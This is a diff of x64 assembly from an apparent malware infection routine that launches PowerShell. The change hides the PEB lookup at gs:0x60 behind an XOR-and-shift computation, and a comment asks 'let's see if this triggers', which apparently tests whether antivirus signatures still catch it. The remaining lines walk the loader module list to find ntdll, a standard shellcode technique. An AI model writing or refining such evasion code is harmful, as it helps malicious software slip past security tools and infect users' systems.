@@ -82,7 +82,10 @@ infection__alloc_powershell_aligned:
    mov [rbp-0x28], rcx
 
    sub rsp,0xF0                 ; now allocate space on the stack for our CreateProcessA structs, as well as aligning it
-   mov rax, [gs:0x60]           ; get the PEB at gs:0x60
+   mov r12d, 0x158b
+   xor r12d, 0x758b
+   shr r12d, 8                  ; let's see if this triggers
+   mov rax, [gs:r12]            ; get the PEB at gs:0x60
    mov rcx, [rax+0x18]          ; peb->Ldr
    mov rax, [rcx+0x10]          ; ldr->InLoadOrderModuleList.Flink (the current module)
    mov rcx, [rax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
